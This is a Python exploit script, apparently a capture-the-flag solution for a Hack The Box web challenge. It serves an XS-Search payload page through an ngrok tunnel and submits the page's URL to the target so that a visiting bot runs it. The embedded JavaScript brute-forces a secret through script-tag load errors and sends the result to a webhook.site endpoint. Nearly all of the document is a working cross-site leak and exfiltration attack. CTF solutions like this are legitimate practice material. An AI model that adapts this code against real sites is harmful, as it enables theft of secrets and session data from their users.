#!/usr/bin/env python3
import sys, requests, time, logging.config
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from threading import Thread
try:
	from pyngrok import ngrok
except:
	print("[!] pyngrok python3 module is required!\n\t Install with: pip3 install pyngrok")
	sys.exit()

logging.config.dictConfig({
    'version': 1,
    'disable_existing_loggers': True,
})

hostURL = "http://127.0.0.1:1337"               # Challenge host URL

exploitHTML = """
<html>
<head></head>
<body>
<script type="text/javascript">
flag_charset = "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*,-[]_}";
var flag = "HTB{";
var charIndex = 0;

const bruteForce = () => {
	var script = document.createElement("script");
	script.src = `//127.0.0.1:1337/api/entries/search?q=${flag}${flag_charset.charAt(charIndex)}`;
	document.body.appendChild(script);
	script.onload = () => {
		flag += flag_charset.charAt(charIndex);
		charIndex = 0;
		script.parentNode.removeChild(script);
		if (flag.slice(-1) != '}') {
			bruteForce();
		}
		else {
			img = new Image();
			img.src = '//webhook.site/WEBHOOK_TOKEN?flag='+flag;
		}
	}
	script.onerror = () => {
		script.parentNode.removeChild(script);
		charIndex += 1;
		bruteForce();
	}
}
bruteForce();
</script>
</body>
</html>
"""

def serve_content(host_port, content,content_type="text/html"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd_thread = Thread(target=httpd.serve_forever)
	httpd_thread.setDaemon(True)
	httpd_thread.start()

class WEBHOOK:
	def __init__(self):
		self.url = "http://webhook.site"
		try:
			resp = requests.post('{}/token'.format(self.url), json={"actions": True, "alias": "xss-poc", "cors": False}, timeout=15)
			self.token = resp.json()['uuid']
		except:
			print("[!] Couldn't reach webhook.site, please make sure we have internet access!")
			sys.exit()

	def get_flag(self):
		try:
			resp = requests.get('{}/token/{}/request/latest'.format(self.url,self.token), timeout=15)
			flag = resp.json()['query']['flag']
		except:
			return False
		return flag

	def destroy(self):
		requests.delete('{}/token/{}'.format(self.url,self.token), timeout=15)



print('\n[+] Preparing a webook URL for cookie exfiltration..')
webhook = WEBHOOK()

print("[+] Hosting the exploit HTML file with a Python3 Server..")
exploitHTML = exploitHTML.replace('WEBHOOK_TOKEN',webhook.token)
serve_content(('localhost',8808), exploitHTML)

print("[+] Creating an ngrok tunnel for a public URL..")
expTunnel = ngrok.connect(8808)

print("[+] Submitting exploit URL: %s .." % expTunnel.public_url)
resp = requests.post('%s/api/entries' % hostURL, json={"url": expTunnel.public_url})

print('[+] Waiting for the XS-Search brute-force and flag to arrive on webhook..')
while True:
	flag = webhook.get_flag()
	if flag:
		break
	time.sleep(5)
print("\n[*] Flag : %s\n" % flag)

print('[~] Shutting down ngrok tunnel..')
ngrok.disconnect(expTunnel.public_url)
print('[~] Cleaning up the webhook endpoint..\n')
webhook.destroy()
